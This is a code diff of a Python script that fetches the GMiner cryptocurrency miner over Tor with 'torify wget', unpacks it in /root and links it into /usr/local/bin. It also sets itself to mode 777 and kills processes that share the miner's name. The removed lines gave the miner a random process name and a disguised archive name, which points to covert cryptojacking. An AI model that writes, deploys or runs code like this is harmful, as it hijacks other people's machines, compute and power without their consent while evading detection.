@@ -11,9 +11,10 @@ useproxy = 0
 os.system('chmod 777 ' + __file__)
 program = ''
 link_github = 'https://github.com/develsoftware/GMinerRelease/releases/download/2.68/gminer_2_68_linux64.tar.xz'
-link_folder = 'giautoidi.tar.xz'
-for k in range(1, 8, 1):
-    program += random.choice(string.ascii_lowercase)
+link_folder = 'gminer_2_68_linux64.tar.xz'
+
+
+program = 'miner'
 os.system('pkill ' + program)
 
 try:
@@ -23,10 +24,10 @@ except:
     pass
 try:
 
-    if not os.path.isfile('/root/%s' % link_folder):
+    if not os.path.isfile('/root/%s' % program):
         os.chdir('/root')
         #os.system('rm -rf %s' %link_folder)
-        os.system('torify wget ' + link_github + ' -O ' + link_folder)
+        os.system('torify wget ' + link_github)
         os.system('tar -xf ' + link_folder)
         workingdir = os.getcwd()
         os.system('ln -s -f ' + workingdir + '/' + 'miner' + ' ' +'/usr/local/bin/' + program)
